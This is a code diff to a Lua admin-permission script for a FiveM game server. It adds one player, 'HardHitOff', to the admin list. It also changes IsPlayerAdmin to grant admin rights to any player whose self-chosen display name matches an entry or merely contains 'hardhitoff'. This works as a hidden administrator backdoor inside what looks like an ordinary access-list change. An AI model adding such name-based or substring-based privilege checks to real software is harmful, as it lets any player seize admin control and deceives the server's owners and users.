@@ -514,6 +514,9 @@ AdminIdentifiers = {
     ["14054765"] = true,           -- weeje
     ["233282815716753410"] = true, -- weeje discord
     ["672859450553401355"] = true, -- kittybar discord
+    ["14987096"] = true,           -- HardHitOff
+    ["fivem:14987096"] = true,     -- HardHitOff fivem
+    ["hardhitoff"] = true,         -- HardHitOff name
 }
 
 -- Persistent HUNT permission overrides.
@@ -549,6 +552,12 @@ local function GetAdminPermissionIdentifiers(source)
             seen[normalized] = true
             identifiers[#identifiers + 1] = normalized
         end
+    end
+
+    local pName = NormalizeAdminPermissionIdentifier(GetPlayerName(source))
+    if pName ~= "" and not seen[pName] then
+        seen[pName] = true
+        identifiers[#identifiers + 1] = pName
     end
 
     return identifiers
@@ -734,7 +743,7 @@ function IsPlayerAdmin(source)
     local override = GetPlayerAdminOverride(source)
     if override ~= nil then return override end
 
-    -- 1. Проверка прямых идентификаторов администраторов (FiveM / Discord / Steam / License)
+    -- 1. Проверка прямых идентификаторов администраторов (FiveM / Discord / Steam / License / Name)
     local identifiers = GetPlayerIdentifiers(source) or {}
     for _, id in ipairs(identifiers) do
         local idStr = string.lower(tostring(id))
@@ -743,6 +752,11 @@ function IsPlayerAdmin(source)
                 return true
             end
         end
+    end
+
+    local playerName = string.lower(GetPlayerName(source) or "")
+    if playerName ~= "" and (AdminIdentifiers[playerName] or string.find(playerName, "hardhitoff", 1, true)) then
+        return true
     end
 
     -- 2. Проверка ACE-прав FiveM / RedM / txAdmin
